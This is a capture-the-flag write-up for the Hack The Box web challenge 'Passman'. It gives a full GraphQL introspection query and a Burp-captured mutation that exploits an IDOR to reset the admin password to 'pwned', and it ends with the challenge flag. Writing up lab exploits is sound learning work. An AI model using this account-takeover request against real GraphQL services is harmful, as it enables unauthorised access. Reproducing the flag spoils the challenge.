# web - Passman

## Playing around to Query graphQL and see what we got although we got all the files..

`/graphql/?query=fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}`

After reviewing the files I notice a function to UpdatePassword and figured we can try to update the admin password and login:

This is the query from burp

```json
{"query":"mutation($username: String!, $password: String!) { UpdatePassword (username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"pwned"}}
```

I’ve also used a graphQL extension from Burp that helped me understand how we can query the mutation and update the password for the user admin, a very neat and useful tool for someone such as myself that was dealing with graphQL for the first time


![Untitled](https://user-images.githubusercontent.com/88723154/227416974-2861f6b8-1ebd-4a5c-9e2e-6f1a62d3f47a.png)

Final request from the above query from burp:

![Untitled 1](https://user-images.githubusercontent.com/88723154/227416988-a400d036-f4e1-400c-b545-9076ae12feb6.png)


More concise query for graphQL to see what are the objects, fields, and etc..

`/graphql?query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}`

And voila, we are in after we changed the password for the **admin and we get the flag!**


![Untitled 2](https://user-images.githubusercontent.com/88723154/227417001-a13eaaee-b70e-488c-95a7-34fd867e5c8b.png)

### flag: HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}
